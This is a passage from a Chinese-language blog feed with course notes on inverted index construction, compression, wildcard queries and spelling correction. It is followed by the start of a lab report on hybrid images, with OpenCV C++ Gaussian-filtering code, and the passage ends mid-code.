id="spimisingle-pass-in-memory-indexing">SPIMI（Single-PassIn-Memory Indexing）</h4><p>不作映射，其他与BSBI一样</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205910771188_815_20221013143640277003_250_image-20220922101959755.png" alt="image-20220922101959755" width="50%" height="50%"></p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205911947753_460_20221013143641398914_475_image-20220922102104189.png" alt="image-20220922102104189" width="50%" height="50%"></p><p>因为D显然要比T小的多</p><h4 id="分布式解决方案mapreduce">分布式解决方案MapReduce</h4><p>大数据实训有涉及，略。</p><h3 id="在线索引构建">在线索引构建</h3><h4 id="朴素方案">朴素方案</h4><h5 id="朴素方案一重建索引">朴素方案一：重建索引</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205913207853_240_20221013143642866848_892_image-20220928141323699.png" alt="image-20220928141323699"><figcaption aria-hidden="true">image-20220928141323699</figcaption></figure><h5 id="朴素方案二辅助索引">朴素方案二：辅助索引</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205915431629_883_20221013143644019596_168_image-20220928141427687.png" alt="image-20220928141427687"><figcaption aria-hidden="true">image-20220928141427687</figcaption></figure><p>使用辅助索引的话，一个很简便的思路是一个词建一个文档，归并便变为两个文档的合并。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205916785627_424_20221013143645445454_230_image-20220928141820357.png" alt="image-20220928141820357"><figcaption aria-hidden="true">image-20220928141820357</figcaption></figure><p>有什么缺陷？文件大小可能差距很大，且大量小文件不便于存储和对索引的快速读写（存储系统的问题）</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205917919255_546_20221013143646682137_270_image-20220928142759774.png" alt="image-20220928142759774"><figcaption aria-hidden="true">image-20220928142759774</figcaption></figure><p>更大的问题，随着文档的数量变大，归并会越来越慢！</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205920273505_343_20221013143647947499_639_image-20220928142854979.png" alt="image-20220928142854979"><figcaption aria-hidden="true">image-20220928142854979</figcaption></figure><p>合并时termID是有序的，归并时类似于归并排序，最坏复杂度是较大的那个索引的termID个数。而单个倒排索引合并只需要把新的list放到旧的后面就可以了，因为新的list中的docID肯定会比旧的大（就像上面图上所示）<span class="math display">\[O\left(n+2n+\ldots+\frac{T}{n}\right)=O\left(\frac{T^2}{n}\right)\]</span></p><h4 id="文档删除怎么操作">文档删除怎么操作？</h4><p>无效向量</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205921700479_104_20221013143649321808_563_image-20220928142307585.png" alt="image-20220928142307585"><figcaption aria-hidden="true">image-20220928142307585</figcaption></figure><h3 id="倒排索引压缩">倒排索引压缩</h3><h4 id="一些朴素的偷懒方法">一些朴素的偷懒方法</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205922962959_958_20221013143650616612_634_image-20220928155207922.png" alt="image-20220928155207922"><figcaption aria-hidden="true">image-20220928155207922</figcaption></figure><p>但是现代检索系统一般不会这么做，因为会导致一些信息的丢失。</p><h4 id="词典压缩">词典压缩</h4><h5 id="方法一使用数组">方法一：使用数组</h5><p>是一种很蠢的方法</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205924880094_389_20221013143654714754_145_image-20220928152210011.png" alt="image-20220928152210011" width="50%" height="50%"></p><h5 id="方法二指针">方法二：指针</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205926029760_841_20221013143655839716_271_image-20220928151740804.png" alt="image-20220928151740804"><figcaption aria-hidden="true">image-20220928151740804</figcaption></figure><h5 id="方法二的优化分段指针">方法二的优化：分段指针</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205927711537_423_20221013143657755792_576_image-20220928152418457.png" alt="image-20220928152418457"><figcaption aria-hidden="true">image-20220928152418457</figcaption></figure><p>当然，找termID对应的词项会慢一些。</p><h5 id="采用前缀的方式">采用前缀的方式</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205929015383_614_20221013143659531464_413_image-20220928153011321.png" alt="image-20220928153011321"><figcaption aria-hidden="true">image-20220928153011321</figcaption></figure><h4 id="索引表压缩">索引表压缩</h4><h5 id="encoding-gaps">Encoding gaps</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205930212514_131_20221013143700905497_456_image-20220928153421273.png" alt="image-20220928153421273"><figcaption aria-hidden="true">image-20220928153421273</figcaption></figure><h5 id="variable-length-codings">Variable length codings</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205931738018_759_20221013143702089613_543_image-20220928153533933.png" alt="image-20220928153533933"><figcaption aria-hidden="true">image-20220928153533933</figcaption></figure><p>例子：可变长UTF-8</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205934903217_281_20221013143703419174_526_image-20220928153849498.png" alt="image-20220928153849498"><figcaption aria-hidden="true">image-20220928153849498</figcaption></figure><p>UTF-8 的编码规则很简单，只有二条：</p><p>1）对于单字节的符号，字节的第一位设为<code>0</code>，后面7位为这个符号的Unicode 码。因此对于英语字母，UTF-8 编码和 ASCII 码是相同的。</p><p>2）对于<code>n</code>字节的符号（<code>n &gt; 1</code>），第一个字节的前<code>n</code>位都设为<code>1</code>，第<code>n + 1</code>位设为<code>0</code>，后面字节的前两位一律设为<code>10</code>。剩下的没有提及的二进制位，全部为这个符号的Unicode 码。</p><p>下表总结了编码规则，字母<code>x</code>表示可用编码的位。</p><p></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-p2q6bhlmrh9u65"></i><span>asciidoc</span><div class="collapse show" id="collapse-p2q6bhlmrh9u65"><pre><code class="hljs asciidoc">Unicode符号范围     |        UTF-8编码方式<span class="hljs-section">(十六进制)        |              （二进制）</span><span class="hljs-section">-------------------+---------------------------------------------</span>0000 0000-0000 007F | 0xxxxxxx0000 0080-0000 07FF | 110xxxxx 10xxxxxx0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</code></pre></div></div><p></p><p>根据上表，解读 UTF-8编码非常简单。如果一个字节的第一位是<code>0</code>，则这个字节单独就是一个字符；如果第一位是<code>1</code>，则连续有多少个<code>1</code>，就表示当前字符占用多少个字节。</p><p>下面，以汉字<code>严</code>为例，演示如何实现 UTF-8 编码。</p><p><code>严</code>的 Unicode是<code>4E25</code>（<code>100111000100101</code>），根据上表，可以发现<code>4E25</code>处在第三行的范围内（<code>0000 0800 - 0000 FFFF</code>），因此<code>严</code>的UTF-8编码需要三个字节，即格式是<code>1110xxxx 10xxxxxx 10xxxxxx</code>。然后，从<code>严</code>的最后一个二进制位开始，依次从后向前填入格式中的<code>x</code>，多出的位补<code>0</code>。这样就得到了，<code>严</code>的UTF-8编码是<code>11100100 10111000 10100101</code>，转换成十六进制就是<code>E4B8A5</code>。</p><h5 id="gamma-encoding">Gamma Encoding</h5><p>根据<a href="https://en.wikipedia.org/wiki/Elias_gamma_coding">维基百科</a>所述，gamma编码过程如下图所示。虽具体过程与课上讲述稍有不同，但原理是一样的。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205936111502_610_20221013143704774266_595_image-20220930155723916.png" alt="image-20220930155723916"><figcaption aria-hidden="true">image-20220930155723916</figcaption></figure><p>编码具体案例和解码过程。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205937375262_217_20221013143706251591_500_image-20220930155802505.png" alt="image-20220930155802505"><figcaption aria-hidden="true">image-20220930155802505</figcaption></figure><h3 id="查询优化">查询优化</h3><h4 id="倒排索引数据结构优化">倒排索引数据结构优化</h4><h5 id="跳表">“跳表”</h5><p>动机</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205939925179_393_20221013143708733468_476_image-20221005150319520.png" alt="image-20221005150319520"><figcaption aria-hidden="true">image-20221005150319520</figcaption></figure><p>怎么选取间隔？“摔瓶子”。开根号</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205941010984_115_20221013143710120784_928_image-20221005150404678.png" alt="image-20221005150404678"><figcaption aria-hidden="true">image-20221005150404678</figcaption></figure><p>实例：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205942199865_675_20221013143711476304_852_image-20221005150523460.png" alt="image-20221005150523460"><figcaption aria-hidden="true">image-20221005150523460</figcaption></figure><p class="note note-info">为什么是先跳再判断，如果跳过了再倒回去，而不是比较之后再跳？后者比较次数太多，开销大，且慢。</p><h4 id="词项数据结构">词项数据结构</h4><h5 id="哈希表">哈希表</h5><p>优点：快</p><p>缺点：不支持模糊查询</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205944152423_245_20221013143713258991_492_image-20221005152131580.png" alt="image-20221005152131580"><figcaption aria-hidden="true">image-20221005152131580</figcaption></figure><h5 id="b树">B树</h5><p>实际使用</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205946525988_190_20221013143716445073_262_image-20221005152231798.png" alt="image-20221005152231798"><figcaption aria-hidden="true">image-20221005152231798</figcaption></figure><h4 id="通配符查询支持">通配符查询支持</h4><p>前缀：B树天然支持</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205948024690_287_20221013143718721740_938_image-20221005153943805.png" alt="image-20221005153943805"><figcaption aria-hidden="true">image-20221005153943805</figcaption></figure><p>后缀：对逆序建B树</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205949456832_729_20221013143720264162_261_image-20221005154022485.png" alt="image-20221005154022485"><figcaption aria-hidden="true">image-20221005154022485</figcaption></figure><p>中间的？好像有点问题。。。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205950707639_732_20221013143721509249_850_image-20221012140726185.png" alt="image-20221012140726185" width="50%" height="50%"></p><h4 id="轮排索引">轮排索引</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205951813968_784_20221013143722646249_170_image-20221012141847402.png" alt="image-20221012141847402"><figcaption aria-hidden="true">image-20221012141847402</figcaption></figure><p>采用B树。但通常这种方法产生的B树会非常大</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205953060880_952_20221013143723834048_694_image-20221012143335531.png" alt="image-20221012143335531"><figcaption aria-hidden="true">image-20221012143335531</figcaption></figure><h4 id="k-gram">K-gram</h4><p>一定程度上的优化</p><p>在一定长度的字串上建索引</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205954611963_730_20221013143725269033_823_image-20221012143730369.png" alt="image-20221012143730369"><figcaption aria-hidden="true">image-20221012143730369</figcaption></figure><p>查$co,ter,er$,$代表起始和结束符号</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205955905050_710_20221013143726834159_151_image-20221012144353569.png" alt="image-20221012144353569"><figcaption aria-hidden="true">image-20221012144353569</figcaption></figure><h3 id="拼写检查支持">拼写检查支持</h3><h4 id="动态规划编辑距离">动态规划：编辑距离</h4><p>动态规划求字符串距离？</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205957265992_890_20221013143728315657_544_image-20221012150059012.png" alt="image-20221012150059012"><figcaption aria-hidden="true">image-20221012150059012</figcaption></figure><p>词项太多，算法显得有些复杂，慢</p><h4 id="在k-gram基础上进行">在K-gram基础上进行</h4><p>Jaccard distance判断相似度</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205958320184_528_20221013143729475948_696_image-20221012151057155.png" alt="image-20221012151057155"><figcaption aria-hidden="true">image-20221012151057155</figcaption></figure><p>求并集的小trick</p><p>#query term's k-grams +#found term's k-grams-#intersection</p><h4 id="上下文相关检查">上下文相关检查</h4><p>利用搜索历史，启发式</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息检索</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hybrid Image</title>
    <link href="/posts/37973/"/>
    <url>/posts/37973/</url>
    
    <content type="html"><![CDATA[<h1 id="hybrid-image">Hybrid Image</h1><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Hybrid%20Image/20230828210854731226_846_20230329203430934130_398_image-20230329203201849.png" alt="image-20230329203201849"><figcaption aria-hidden="true">image-20230329203201849</figcaption></figure><p>•A. Oliva, A. Torralba, P.G. Schyns, <a href="http://cvcl.mit.edu/hybridimage.htm">“Hybrid Images,”</a> SIGGRAPH2006</p><h3 id="实验目的">实验目的</h3><p>了解图像处理的基础，熟悉高斯滤波操作。</p><h3 id="实验原理">实验原理</h3><p>根据论文，混合图像是通过在两个不同的空间尺度上叠加两个图像来生成的：低空间尺度是通过低通滤波器对一个图像进行滤波来获得的；通过用高通滤波器对第二图像进行滤波来获得高空间尺度。通过将这两个滤波后的图像相加来合成最终图像。</p><h3 id="实验过程">实验过程</h3><h4 id="直接高斯滤波">直接高斯滤波</h4><p>最简单的，我们可以调用OpenCV的<code>GaussianBlur</code>对图像进行高斯滤波，得到低频图像，然后用原图像和减去低频图像就可以得到高频图像。</p><p><code>GaussianBlur</code>函数对操作进行了封装。如</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6nak1qlmrh9u64"></i><span>C++</span><div class="collapse show" id="collapse-6nak1qlmrh9u64"><pre><code class="hljs C++"><span class="hljs-built_in">GaussianBlur</span>(low_img, blurred_low, <span class="hljs-built_in">Size</span>(<span class="hljs-number">25</span>, <span class="hljs-number">25</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)</code></pre></div></div><p>生成的高斯滤波器<code>kernel size</code>为25×25，后两个参数为0表示让OpenCV自动根据滤波器大小选择高斯函数中的<span class="math inline">\(\sigma\)</span>参数。最后面省略了一个参数表示<code>padding</code>的方式，默认为<code>BORDER_DEFAULT</code>，及不含边界值倒序填充。</p><p>完整代码如下:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-sq6t5vlmrh9u64"></i><span>C++</span><div class="collapse show" id="collapse-sq6t5vlmrh9u64"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;opencv2\opencv.hpp&gt;</span> </span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> cv;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{Mat high_img;Mat low_img;high_img = <span class="hljs-built_in">imread</span>(<span class="hljs-string">"C:/Users/LENOVO/Desktop/CV_course/Einstein.png"</span>);low_img = <span class="hljs-built_in">imread</span>(<span class="hljs-string">"C:/Users/LENOVO/Desktop/CV_course/Marilyn.png"</span>);Mat blurred_low;<span class="hljs-built_in">GaussianBlur</span>(low_img, blurred_low, <span class="hljs-built_in">Size</span>(<span class="hljs-number">25</span>, <span class="hljs-number">25</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);Mat einstein_mask;<span class="hljs-built_in">imshow</span>(<span class="hljs-string">"blurred"</span>, blurred_low);Mat highpassed_high;<span class="hljs-built_in">GaussianBlur</span>(high_img, highpassed_high, <span class="hljs-built_in">Size</span>(<span class="hljs-number">25</span>, <span class="hljs-number">25</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<span class="hljs-built_in">subtract</span>(high_img, highpassed_high, highpassed_high);<span class="hljs-built_in">imshow</span>(<span class="hljs-string">"highpassed"</span>, highpassed_high);Mat hybrid_img = blurred_low + highpassed_high;<span class="hljs-built_in">imshow</span>(<span class="hljs-string">"Hybrid Image"</span>, hybrid_img);<span class="hljs-built_in">waitKey</span>(<span class="hljs-number">0</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p>以经典的<code>Einstein</code>和<code>Marilyn</code>为例得到结果如下所示:</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Hybrid%20Image/20230828210855964441_824_20230329204715965717_301_image-20230329095603969.png" alt="image-20230329095603969" width="67%" height="67%"></p><h4 id="频率域高斯滤波">频率域高斯滤波</h4><p>实际上论文中原文有:</p><blockquote><p>A hybrid image <span class="math inline">\((H)\)</span> is obtainedby combining two images <span class="math inline">\(\left(I_1\right.\)</span> and <span class="math inline">\(I_2\)</span> ), one filtered with a low-passfilter <span class="math inline">\(\left(G_1\right)\)</span> and thesecond one filtered with a high-pass filter <span class="math inline">\(\left(1-G_2\right): H=I_1 \cdot G_1+I_2\cdot\left(1-G_2\right)\)</span>, the operations are defined in theFourier domain. Hybrid images</p></blockquote><p>也就是说我们需要在频率域进行操作。</p><p>一张图片可以表示成 <span class="math inline">\(\sum_{i, j} R_{ij}\)</span>, 其中 <span class="math inline">\(R_{i j}\)</span>代表作坐标为 <span class="math inline">\((i, j)\)</span>的图片像素。</p><p>过滤过的图片 <span class="math inline">\(R\)</span>, 是由滤波器 <span class="math inline">\(H\)</span> 对 <span class="math inline">\(F\)</span> 做卷积。 <span class="math display">\[\begin{aligned}R_{i j} &amp; =\sum_{u, v} H_{i-u, j-v} F_{u, v} \\\mathbf{R} &amp; =\mathbf{H} * * \mathbf{F}\end{aligned}\]</span> 与直接高斯滤波不同， <span class="math inline">\(F\)</span>是将目标图片做过傅立叶转换(FFT)，并且将频率零平移置中(FFTShift) 而产生的2D 频谱(Spectrum) 靠近中央代表低频信号,靠近边界代表高频信号。其中高频信号代表剧烈或是边角。 其中高斯滤波器<span class="math inline">\(H\)</span> 定义如下: <span class="math display">\[g(i, j)=E X P\left(-\frac{(x-i)^2+(y-j)^2}{2 \sigma^2}\right)\]</span> 其中 <span class="math inline">\(\sigma\)</span>截止频率,<span class="math inline">\((i, j)\)</span> 是图片像素点位置, 而 <span class="math inline">\((x, y)\)</span> 是中心点。</p><p>下面参照原理动手实现频率域高斯滤波操作。其中<a href="https://tigercosmos.xyz/post/2020/04/cv/hybrid-image/">这篇文章</a>的python代码给我的整体思路有较大帮助。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-oilms7lmrh9u64"></i><span>C++</span><div class="collapse show" id="collapse-oilms7lmrh9u64"><pre><code class="hljs C++">output[<span class="hljs-number">0</span>] = img.<span class="hljs-built_in">clone</span>();output[<span class="hljs-number">1</span>] = Mat::<span class="hljs-built_in">zeros</span>(img.<span class="hljs-built_in">size</span>(), CV_32FC1);Mat complexIm;<span class="hljs-built_in">merge</span>(output, <span class="hljs-number">2</span>, complexIm); <span class="hljs-built_in">dft</span>(complexIm, complexIm);<span class="hljs-comment">// 分离通道（数组分离）</span><span class="hljs-built_in">split</span>(complexIm, output);<span class="hljs-comment">// 以下的操作是频域迁移</span><span class="hljs-built_in">fftshift</span>(output[<span class="hljs-number">0</span>], output[<span class="hljs-number">1</span>]);</code></pre></div></div><p>先将原来的图像分成实数域和复数域(暂时为0),再合并通道（把两个矩阵合并为一个2通道的Mat类容器），进行离散傅里叶变换。</p><p>为了方便观察，使用<code>fftshift</code>频域迁移将原点移到中间。<code>OpenCV</code>中没有直接给出<code>fftshift</code>的接口，但实际上它很简单，只是<code>dft</code>取了频谱上$[ 0 , f s ] $的部分，由于频谱是按 <span class="math inline">\(\mathrm{f}_{\mathrm{s}}\)</span> 周期延拓，所以<span class="math inline">\(\left[\mathrm{f}_{\mathrm{s}} / 2,\mathrm{f}_{\mathrm{s}}\right]\)</span> 部分的频谱与 <span class="math inline">\(\left[-\mathrm{f}_{\mathrm{s}} /2,0\right]\)</span> 部分的一样，如果想看 <span class="math inline">\(\left[-\mathrm{f}_{\mathrm{s}},\mathrm{f}_{\mathrm{s}}\right]\)</span> 部分，就需要做<code>fftshift</code>，将零频分量移到序列中间，对于一维，左右交换即可。图像是二维的，那么就左上和右下交换。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-x65kmylmrh9u64"></i><span>C++</span><div class="collapse show" id="collapse-x65kmylmrh9u64"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span 